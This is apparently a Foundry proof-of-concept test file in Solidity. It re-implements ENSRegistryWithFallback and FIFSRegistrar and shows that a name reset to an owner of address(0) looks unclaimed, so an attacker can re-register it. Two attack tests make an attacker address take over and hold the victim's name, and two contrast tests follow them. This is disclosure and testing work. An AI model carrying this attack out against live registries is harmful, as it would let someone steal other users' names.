// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ─────────────────────────────────────────────────────────────────────────────
//  Foundry PoC - Zombie Re-Registration Race
//
//  ENSRegistryWithFallback sentinel creates a state where a name appears
//  "unclaimed" (owner() == address(0)) but is internally locked (sentinel).
//  FIFSRegistrar reads owner() and treats address(0) as "anyone can claim".
//  This allows a racing attacker to steal a zombie-locked name.
//
//  Run:  forge test --match-contract ZombieReregistrationTest -vv
//
//  Convention: FAIL = bug present / attack succeeds
//              PASS = system behaves correctly (defence holds)
// ─────────────────────────────────────────────────────────────────────────────

interface Vm {
    function startPrank(address sender) external;
    function stopPrank() external;
}

interface ENSIface {
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external returns (bytes32);
    function setOwner(bytes32 node, address owner) external;
    function owner(bytes32 node) external view returns (address);
    function recordExists(bytes32 node) external view returns (bool);
    function isApprovedForAll(address owner_, address operator) external view returns (bool);
}

// ── Plain ENSRegistry (reference / old registry) ────────────────────────────

contract ENSRegistry is ENSIface {
    struct Record { address owner; address resolver; uint64 ttl; }
    mapping(bytes32 => Record) internal records;
    mapping(address => mapping(address => bool)) internal operators;

    modifier authorised(bytes32 node) {
        address o = records[node].owner;
        require(o == msg.sender || operators[o][msg.sender], "not authorised");
        _;
    }

    constructor() { records[bytes32(0)].owner = msg.sender; }

    function setSubnodeOwner(bytes32 node, bytes32 label, address o)
        external virtual override authorised(node) returns (bytes32)
    {
        bytes32 sub = keccak256(abi.encodePacked(node, label));
        _setOwner(sub, o);
        return sub;
    }

    function setOwner(bytes32 node, address o)
        external virtual override authorised(node)
    {
        _setOwner(node, o);
    }

    function owner(bytes32 node) public virtual override view returns (address) {
        address addr = records[node].owner;
        if (addr == address(this)) return address(0);
        return addr;
    }

    function recordExists(bytes32 node) public virtual override view returns (bool) {
        return records[node].owner != address(0);
    }

    function isApprovedForAll(address o, address op) external virtual override view returns (bool) {
        return operators[o][op];
    }

    function _setOwner(bytes32 node, address o) internal virtual {
        records[node].owner = o;
    }
}

// ── ENSRegistryWithFallback (deployed on mainnet) ────────────────────────────

contract ENSRegistryWithFallback is ENSRegistry {
    ENSIface public old;

    constructor(ENSIface _old) {
        old = _old;
    }

    function owner(bytes32 node) public override view returns (address) {
        if (!recordExists(node)) return old.owner(node);
        return super.owner(node);
    }

    // Sentinel: address(0) -> address(this)
    // owner() masks address(this) back to address(0)  <- public API
    // recordExists() sees address(this) != address(0) <- returns true
    // authorised() reads raw storage address(this)    <- blocks everyone
    function _setOwner(bytes32 node, address o) internal override {
        if (o == address(0)) o = address(this);
        super._setOwner(node, o);
    }
}

// ── FIFSRegistrar (First-In-First-Served registrar) ─────────────────────────

contract FIFSRegistrar {
    ENSIface ens;
    bytes32 rootNode;

    modifier only_owner(bytes32 label) {
        address currentOwner = ens.owner(keccak256(abi.encodePacked(rootNode, label)));
        // CRITICAL: reads ens.owner() which returns address(0) for zombie-locked nodes
        // This treats zombie nodes as "unclaimed" - anyone can register them
        require(currentOwner == address(0) || currentOwner == msg.sender, "not owner");
        _;
    }

    constructor(ENSIface _ens, bytes32 _rootNode) {
        ens = _ens;
        rootNode = _rootNode;
    }

    function register(bytes32 label, address newOwner) public only_owner(label) {
        ens.setSubnodeOwner(rootNode, label, newOwner);
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

contract ZombieReregistrationTest {
    Vm internal constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    ENSRegistry             internal oldReg;
    ENSRegistryWithFallback internal reg;
    FIFSRegistrar           internal fifs;

    address internal constant ALICE   = address(0x1111111111111111111111111111111111111111);
    address internal constant ATTACKER = address(0x2222222222222222222222222222222222222222);

    bytes32 internal constant ZERO_HASH = bytes32(0);
    bytes32 internal testNode;   // namehash("test")
    bytes32 internal aliceNode;  // namehash("alice.test")
    bytes32 internal aliceLabel; // keccak256("alice")

    function setUp() public {
        oldReg = new ENSRegistry();
        reg    = new ENSRegistryWithFallback(ENSIface(address(oldReg)));

        bytes32 testLabel = keccak256(abi.encodePacked("test"));
        aliceLabel = keccak256(abi.encodePacked("alice"));

        testNode  = keccak256(abi.encodePacked(ZERO_HASH, testLabel));
        aliceNode = keccak256(abi.encodePacked(testNode,  aliceLabel));

        // Deploy FIFSRegistrar owning testNode in the NEW registry
        fifs = new FIFSRegistrar(ENSIface(address(reg)), testNode);

        // Give FIFSRegistrar ownership of testNode in both registries
        reg.setSubnodeOwner(ZERO_HASH, testLabel, address(fifs));

        // Alice registers alice.test via FIFSRegistrar
        vm.startPrank(ALICE);
        fifs.register(aliceLabel, ALICE);
        vm.stopPrank();

        // Verify setup: Alice owns alice.test
        require(reg.owner(aliceNode) == ALICE, "setup: Alice must own alice.test");
    }

    // ── ATTACK-1: Attacker steals zombie-locked name via FIFSRegistrar ─────
    //
    // Steps:
    //   1. Alice zombie-locks alice.test (sets owner to address(0))
    //   2. Attacker calls FIFSRegistrar.register(aliceLabel, attacker)
    //   3. FIFSRegistrar sees owner() == address(0) -> treats as unclaimed
    //   4. Attacker becomes owner of alice.test
    //
    // Expected correct behaviour: zombie-locked name is NOT re-registerable
    // because Alice has not truly abandoned it (recordExists stays true,
    // the sentinel internally claims the slot).
    //
    // FAIL = bug confirmed (attacker stole the name)

    function test_ATTACK1_AttackerStealsZombieLockedName() public {
        // Alice zombie-locks her name
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // Confirm zombie state: public API says no owner
        require(reg.owner(aliceNode) == address(0), "setup: owner must appear as address(0)");
        // Internal sentinel still holds the slot
        require(reg.recordExists(aliceNode) == true, "setup: record must still exist (sentinel)");

        // Attacker exploits the zombie via FIFSRegistrar
        // FIFSRegistrar.only_owner reads owner() == address(0) -> treats as unclaimed
        vm.startPrank(ATTACKER);
        fifs.register(aliceLabel, ATTACKER);
        vm.stopPrank();

        // Expected: ALICE still owns the name (or at minimum ATTACKER should not)
        // Bug: ATTACKER now owns it
        require(
            reg.owner(aliceNode) != ATTACKER,
            "ATTACK-1 CONFIRMED: attacker stole zombie-locked name via FIFSRegistrar"
        );
    }

    // ── ATTACK-2: Alice cannot self-recover before attacker claims ─────────
    //
    // Shows the RACE CONDITION: Alice zombie-locks and tries to recover.
    // In the same block an attacker wins the race.
    // This contrasts with plain ENSRegistry where the behaviour is expected:
    // setting owner=0 truly clears the record, making it legitimately unclaimed.
    //
    // In ENSRegistryWithFallback the zombie-lock was supposed to be a MIGRATION
    // sentinel (not a "clear" operation), but it looks identical to "unclaimed"
    // to any FIFSRegistrar reading owner().
    //
    // FAIL = attacker wins race (attack feasible)

    function test_ATTACK2_RaceConditionZombieVsFIFSRegistrar() public {
        // Step 1: Alice zombie-locks (e.g. phished or mistakes clearing for deleting)
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // Step 2: Attacker front-runs Alice's recovery by calling register first
        vm.startPrank(ATTACKER);
        fifs.register(aliceLabel, ATTACKER);
        vm.stopPrank();

        // Step 3: Alice tries to recover by re-registering herself
        vm.startPrank(ALICE);
        // only_owner now sees ATTACKER as owner (not address(0)) - ALICE is blocked
        // This should REVERT with "not owner"
        bool aliceCanRecover = false;
        try fifs.register(aliceLabel, ALICE) {
            aliceCanRecover = true;
        } catch {}
        vm.stopPrank();

        // Expected: Alice can recover (she's the legitimate original owner)
        // Bug: Alice is locked out - attacker permanently owns the name
        require(
            aliceCanRecover,
            "ATTACK-2 CONFIRMED: Alice cannot recover her name after attacker wins race"
        );
    }

    // ── CONTRAST-1: Plain ENSRegistry clears records properly ─────────────
    //
    // In plain ENSRegistry: setOwner(node, address(0)) truly writes address(0).
    // FIFSRegistrar can re-register -> EXPECTED BEHAVIOUR (user abandoned name).
    // No inconsistency - owner() and internal storage agree on address(0).
    //
    // This test PASSES to show plain registry is internally consistent.
    // The contrast with ATTACK-1 shows ENSRegistryWithFallback introduces
    // an inconsistency: sentinel was meant for migration, not abandonment.

    function test_CONTRAST1_PlainRegistryReregistrationIsExpected() public {
        // Deploy standalone plain registry (no fallback)
        ENSRegistry plain = new ENSRegistry();

        bytes32 testLabel = keccak256(abi.encodePacked("test2"));
        bytes32 aliceLabel2 = keccak256(abi.encodePacked("alice2"));
        bytes32 testNode2  = keccak256(abi.encodePacked(ZERO_HASH, testLabel));
        bytes32 aliceNode2 = keccak256(abi.encodePacked(testNode2, aliceLabel2));

        FIFSRegistrar fifs2 = new FIFSRegistrar(ENSIface(address(plain)), testNode2);
        plain.setSubnodeOwner(ZERO_HASH, testLabel, address(fifs2));

        vm.startPrank(ALICE);
        fifs2.register(aliceLabel2, ALICE);
        vm.stopPrank();

        require(plain.owner(aliceNode2) == ALICE, "plain setup: Alice must own alice2.test2");

        // Alice "clears" her name in plain registry
        vm.startPrank(ALICE);
        plain.setOwner(aliceNode2, address(0));
        vm.stopPrank();

        // In plain registry: truly cleared (no sentinel)
        require(plain.owner(aliceNode2) == address(0), "plain: owner is address(0)");
        require(!plain.recordExists(aliceNode2), "plain: record truly gone (no sentinel)");

        // Attacker re-registers - EXPECTED since Alice truly abandoned it
        vm.startPrank(ATTACKER);
        fifs2.register(aliceLabel2, ATTACKER);
        vm.stopPrank();

        // This is expected/correct - plain registry and FIFSRegistrar agree
        // The record was genuinely abandoned; no inconsistency.
        require(
            plain.owner(aliceNode2) == ATTACKER,
            "plain: re-registration by attacker expected after abandonment"
        );

        // KEY DIFFERENCE with ENSRegistryWithFallback:
        // Plain registry: recordExists was FALSE before re-registration (clear intent)
        // Fallback registry: recordExists stays TRUE (sentinel) but owner() lies as address(0)
        // FIFSRegistrar cannot distinguish these cases - it only reads owner()
        // This inconsistency makes zombie-lock semantically ambiguous to downstream contracts
    }

    // ── CONTRAST-2: In ENSRegistryWithFallback, zombie != abandoned ────────
    //
    // Proves that recordExists() shows TRUE even after zombie-lock.
    // An "abandoned" record in plain registry has recordExists=FALSE.
    // A zombie-locked record has recordExists=TRUE (sentinel holds the slot).
    // FIFSRegistrar treats both as equivalent because it only reads owner().
    //
    // PASS = test passes confirming the semantic gap exists

    function test_CONTRAST2_ZombieSemanticGap() public {
        // Zombie-lock Alice's name
        vm.startPrank(ALICE);
        reg.setOwner(aliceNode, address(0));
        vm.stopPrank();

        // FIFSRegistrar sees address(0) - treats as unclaimed
        address visibleOwner = reg.owner(aliceNode);
        bool slotExists = reg.recordExists(aliceNode);

        // These two facts CONTRADICT each other from FIFSRegistrar's perspective:
        require(visibleOwner == address(0), "zombie: API says no owner");
        require(slotExists == true, "zombie: but record exists (sentinel blocks fallback)");

        // The sentinel was designed to say "this slot is claimed in new registry"
        // but owner() masks it as "nobody owns this" - semantic contradiction.
        // FIFSRegistrar trusts owner() -> allows re-registration of a "claimed" slot.
        // This confirms the semantic gap that enables ATTACK-1.
    }
}
